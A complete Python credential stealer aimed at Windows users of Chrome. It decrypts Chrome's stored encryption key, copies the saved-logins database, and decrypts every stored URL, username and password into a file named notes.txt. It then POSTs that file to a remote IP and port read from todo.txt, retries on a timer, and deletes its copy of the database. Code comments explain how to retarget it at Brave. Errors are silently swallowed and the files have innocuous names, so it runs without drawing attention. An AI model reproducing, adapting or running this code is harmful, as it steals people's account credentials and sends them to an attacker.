import sqlite3
import shutil
import base64
import json
import os
import requests
import threading
from Crypto.Cipher import AES
import win32crypt
import sys


def delete_file():
    #os.remove("notes.txt")
    try:
        os.remove(file)
    except:
        pass


try:
    with open("todo.txt", "r") as f:
        lines = f.readlines()
        ip_address = lines[0].strip()
        interval = int(lines[1])
        port = lines[2]
        f.close()
except:
    pass

def send():
    try:
        with open("notes.txt", "r") as f:
            payload = json.dumps({"content": f.read()})
            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
        delete_file()
        return
    except:
        try:
            timer = threading.Timer(interval, send)
            timer.start()
        except:
            return


def store_data(data):
    with open("notes.txt", 'a') as f:
        f.write("##########################################")
        f.write(data)
        f.write("##########################################")


def fetch_key():
    try:
        try:
            local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData/Local/Google/Chrome/User Data/Local State")#use replace this line whit following line to extract passwords from brave: local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State")
        except:
            sys.exit(0)
            
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return


def decrypt_password(password, key):
    try:
        i = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, i)
        
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords Found"

try:
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData/Local/Google/Chrome/User Data/Default/Login Data")#use replace this line whit following line to extract passwords from brave: db_path = os.path.join(os.environ["USERPROFILE"], "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data")
except:
    sys.exit(0)
file = "data.db"
try:
    shutil.copyfile(db_path, file)
except:
    sys.exit(0)
    
db = sqlite3.connect(file)
cursor = db.cursor()

cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "" order by date_last_used")

for row in cursor.fetchall():
    main_url = row[0]
    login_page_url = row[1]
    user_name = row[2]
    date_of_creation = row[4]
    last_usuage = row[5]

    if user_name or decrypt_password(row[3], fetch_key()):
        data = f"\nAction URL:    {main_url}\nLogin URL:    {login_page_url}\nUsername:    {user_name}\nPassword:    {decrypt_password(row[3], fetch_key())}\n"
        store_data(data)
    else:
        continue

cursor.close()
db.close()
send()
